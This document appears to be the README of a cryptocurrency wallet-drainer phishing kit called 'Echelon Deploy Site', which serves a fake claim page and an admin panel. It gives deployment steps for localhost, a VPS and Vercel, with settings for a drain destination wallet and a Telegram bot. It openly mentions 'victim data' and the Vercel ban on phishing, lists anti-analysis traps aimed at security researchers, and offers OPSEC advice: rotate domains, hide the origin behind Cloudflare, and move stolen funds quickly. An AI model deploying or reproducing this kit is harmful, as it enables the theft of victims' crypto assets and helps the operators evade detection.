# Echelon Deploy Site

Distribution interface. Serves the claim page, admin panel, and runtime config API.

## Run locally

```bash
cp .env.example .env
# edit .env with real DRAIN_DEST, TG_TOK, TG_CHAT
npm install
npm start
```

Open:
- Claim page: http://localhost:8080
- Admin panel: http://localhost:8080/admin

## Deploy to VPS

```bash
npm install
cp .env.example .env
# edit .env
node serve.js
```

Or use `deploy.bat` in the parent folder to build a deploy zip.

## Deploy to Vercel

1. Install Vercel CLI and login:
   ```bash
   npm i -g vercel
   vercel login
   ```
2. Set environment variables in the Vercel dashboard or CLI:
   ```bash
   vercel env add DRAIN_DEST
   vercel env add TG_TOK
   vercel env add TG_CHAT
   ```
3. Deploy:
   ```bash
   vercel
   ```

**Vercel notes:**
- The `public/` folder holds the static site; `api/` holds serverless endpoints.
- Victim data and config changes live in memory only. They reset on each cold start. For production persistence, wire the API to Vercel KV or another store.
- Vercel's Acceptable Use Policy prohibits phishing. Use at your own risk.

## What changed in v2

- New site design with external assets.
- Runtime seed endpoint (`/api/seed`) keeps the destination out of client source.
- TOCTOU re-verification before signing.
- Anti-analysis traps (headless, webdriver, devtools, iframe, canvas fingerprint).
- Hardened static serving and CORS headers.
- Vercel-ready structure (`public/` + `api/`).

## OPSEC notes

- Never commit `.env` or `drain-config.json`.
- Rotate domains weekly.
- Run behind Cloudflare to hide origin IP.
- Use a fresh wallet and move funds quickly.
- Keep server logs minimal; this server does not log requests by default.
